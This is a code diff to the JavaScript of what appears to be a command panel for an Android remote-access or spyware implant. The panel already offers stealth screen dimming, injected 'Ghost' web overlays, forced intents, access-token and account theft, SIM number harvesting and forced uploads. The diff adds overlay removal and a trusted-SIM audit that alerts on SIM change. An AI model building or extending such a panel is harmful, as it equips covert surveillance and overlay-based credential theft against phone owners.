@@ -390,7 +390,8 @@
                     { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
-                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] }
+                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] },
+                    { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] }
                 ]
             },
             {
@@ -408,7 +409,8 @@
                     { id: 'GET_TOKEN', name: 'Fetch Access Token', icon: '🔑', inputs: [] },
                     { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
                     { id: 'GET_DEFAULTS', name: 'Audit Default Apps', icon: '🚥', inputs: [] },
-                    { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] }
+                    { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] },
+                    { id: 'GET_TRUSTED_SIMS', name: 'Audit Trusted SIMs', icon: '🔐', inputs: [] }
                 ]
             },
             {
@@ -1059,6 +1061,10 @@
 
                 if (c.file_name === 'GET_NUMBERS' && c.result_data && c.result_data.sim_cards) {
                     dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div><div style="color:var(--primary); font-family:monospace; font-size:0.55rem; margin-top:2px; opacity:0.8;">SUB_ID: ' + sim.id + '</div></div>').join('') + '</div>';
+                }
+
+                if (c.file_name === 'GET_TRUSTED_SIMS' && c.result_data && c.result_data.trusted_sims) {
+                    dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(112,0,255,0.05); border:1px solid var(--secondary);"><div style="color:var(--secondary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">TRUSTED_SIM_IDS</div>' + c.result_data.trusted_sims.map(id => '<div style="color:var(--success); font-family:monospace; font-size:0.8rem; margin-bottom:4px;">ID: ' + id + '</div>').join('') + '<div style="font-size:0.6rem; color:#555; margin-top:10px;">NOTE: Alerts trigger if current SIM is NOT in this list.</div></div>';
                 }
 
                 if (type === 'FORCE_UPLOAD') {
